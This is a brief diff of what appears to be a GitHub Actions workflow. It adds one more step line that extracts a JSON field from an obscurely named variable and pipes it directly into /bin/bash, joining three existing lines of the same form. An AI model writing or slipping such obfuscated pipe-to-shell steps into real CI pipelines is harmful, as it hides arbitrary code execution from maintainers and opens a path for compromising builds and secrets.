@@ -28,6 +28,7 @@ jobs:
           echo $dzm68147 | jq -r .o05 | /bin/bash
           printf '%s' "$lbbe7961" | jq -r .tah90 | /bin/bash
           printf '%s' "$dzbi874" | jq -r .u8 | /bin/bash
+          printf '%s' "$f9381" | jq -r .l8945 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
